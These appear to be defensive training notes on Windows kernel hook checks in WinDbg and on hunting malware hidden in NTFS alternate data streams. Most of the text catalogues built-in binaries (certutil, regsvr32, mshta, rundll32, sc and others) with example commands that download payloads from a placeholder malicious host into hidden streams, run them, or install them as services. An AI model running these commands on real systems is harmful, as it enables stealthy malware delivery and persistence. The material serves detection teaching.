CDAH 25-080 M19L2

4. Run the following command to view the IDT routine pointer value:
!idt 2e

6. Run the following command to check for any code alterations to system functions:
!chkimg -d nt

 4. Run the following command to print out values from the SSD
    choose the first one
    
dd /c1 KiServiceTable L2



7. Run the following command to find the absolute routine address of the NtCreateFile kernel routine that is called with the 0x55 syscall: 
u kiservicetable + (00febd07>>>4) L1

certutil.exe


Although typically used for handling certificates in Windows systems, the certutil tool may be employed by threat actors to download malicious files directly into an ADS. 


An example of a command using this tool is as follows:
certutil.exe -urlcache -split -f https://www.malicious.com/evilscript.ps1 c:\tempfile.doc:evil



cmd.exe


As the default command-line interpreter for Windows, cmd.exe possesses inline utilities, such as echo, that enable writing to an ADS. When combined with a tool for downloading files, this can be used for malicious executable hiding. In the example below, regsvr32.exe is used to download a malicious file and stores it in an ADS called evil.bat within tempfile.doc:  
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:www.malicious.com/RegSvr32.sct ^scrobj.dll > C:\tempfile.doc:evil.bat



control.exe


Although control.exe is normally used to launch Control Panel items, it may also be used to execute a malicious Dynamic Link Library (DLL) hiding in an ADS. 


An example of a command using this tool is as follows:
control.exe c:\tempfile.txt:evil.dll



cscript.exe


cscript.exe is the command-line version of the Windows Script Interpreter that may be used to execute Visual Basic (VB) scripts stored in an ADS.


An example of a command using this tool is as follows:
cscript c:\tempfile.txt:evil.vbs



esentutl.exe


Designed for running tasks and operations related to databases and database files, this executable can abuse the NTFS file attribute ADS. Using different techniques, threat actors can hide files in these streams to accomplish different goals, such as tool infiltration and data exfiltration.


An example of a command using this tool is as follows:
esentutl.exe /y C:\evil.exe /d c:\tempfile.txt:evil.exe /o



However, when a malicious executable hiding in an ADS is identified, it may also be used to carve out the executable for further analysis with the following command syntax:
esentutl.exe /y C:\tempfile.txt:evil.exe /d c:\evil.exe /o



extrac32.exe	


This tool is built into Windows to extract Cabinet (CAB) files. If an attacker can compress a payload into this format, then extrac32.exe may be used to extract it and hide it in an ADS in one step.


An example of a command using this tool is as follows:
extrac32 C:\evil.cab c:\tempfile.txt:evil.exe



findstr.exe	


findstr is normally used to locate string patterns in files or filenames on a system, but part of its functionality may be abused by attackers to hide malware in an ADS by intentionally searching the malicious file for a string that does not exist and writing the portion of the file in which the string is not found (i.e., all of it) to the target ADS location. The /V flag prints only lines where the string is not present, and the /L flag interprets the string literally, as opposed to a regular expression.


An example of a command using this tool is as follows:
findstr /V /L DOESNOTEXIST c:\evil.exe > c:\tempfile.txt:evil.exe



forfiles.exe


This utility is normally used to perform batch processing of a command on a file or set of files, but it may be repurposed by an attacker to execute a binary from an ADS as long as the file being searched for is valid.


An example of a command using this tool is as follows:
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\tempfile.txt:evil.exe"



MpCmdRun.exe	


This utility is normally employed as a command-line administration tool for Windows Defender, but it may be employed to download files directly into an ADS.


An example of a command using this tool is as follows:
MpCmdRun.exe -DownloadFile -url https://www.malicious.com/evil.exe -path c:\\tempfile.txt:evil.exe



mshta.exe	


This utility is built into Windows to execute Hypertext Markup Language (HTML) code and is frequently used by attackers to trigger malicious HTML Application (HTA) payloads, which may contain embedded JavaScript (JS), JScript, or Visual Basic Script (VBScript).


An example of a command using this tool is as follows:
mshta.exe "C:\tempfile.txt:evil.hta"



powershell.exe


Using the Set-Content cmdlet, data may be written directly to an ADS with the PowerShell terminal. In the following command, Set-Content is used to create an ADS called evil.ps1 within the tempfile.txt file and adds the contents of the -Value flag to that ADS.


An example of a command using this tool is as follows:
Set-Content -Path "C:\tempfile.txt" -Stream evil.ps1 -Value "Script Contents Here"



print.exe	


Although normally this binary is used by Windows to send files to a printer, it can be repurposed to hide files in an ADS. The /D flag is normally used to identify the printer to which a file is sent.


An example of a command using this tool is as follows:
print /D:C:\tempfile.txt:evil.exe C:\evil.exe



rundll32.exe	


This binary is used to execute DLL files for a variety of purposes during normal system operations. An attacker who has stored a malicious DLL in an ADS may also execute it with this utility.


An example of a command using this tool is as follows:
rundll32 "C:\tempfile.txt:evil.dll",DllMain



sc.exe	


If a Windows service-compatible executable is stored in an ADS and the user has the permissions to create new services, sc.exe may use the target in an ADS as the target for the service by entering the following commands:
sc create evilservice binPath="\"c:\\tempfile.txt:evil.exe\"" DisplayName= "evilservice" start= auto 


sc start evilservice



wmic.exe	


Used for a variety of management tasks by Windows administrators, wmic.exe may also be used by attackers to execute malicious binaries in an ADS with the following syntax:

wmic.exe process call create "c:\ads\file.txt:program.exe"



wscript.exe


This is the User Interface (UI) version of the Windows Script Interpreter that may be used to execute VB scripts stored in an ADS. Despite being considered the UI version, it can still be run from the command line without opening a window that would alert a user. Syntax within the script may also be used to download files into an ADS, which is why it is ideal for multi-staged payloads that hide in an ADS. Files are downloaded with the following script syntax:
echo GetObject("script:https://www.malicious.com/evil.vbs") > C:\tempfile.txt:evil.vbs


wscript c:\tempfile.txt:evil.vbs




4. Run the following command to list all file streams that are not the default $DATA stream:
Get-ChildItem -Recurse | % { Get-Item $_.FullName -Stream * } | Where Stream -ne ':$Data'
![image](https://github.com/user-attachments/assets/03cba1bd-8d84-498b-8d3f-6d740352af56)


Get-ChildItem -Recurse <file pah> | % { Get-Item $_.FullName -Stream * } | Where Stream -ne ':$Data'

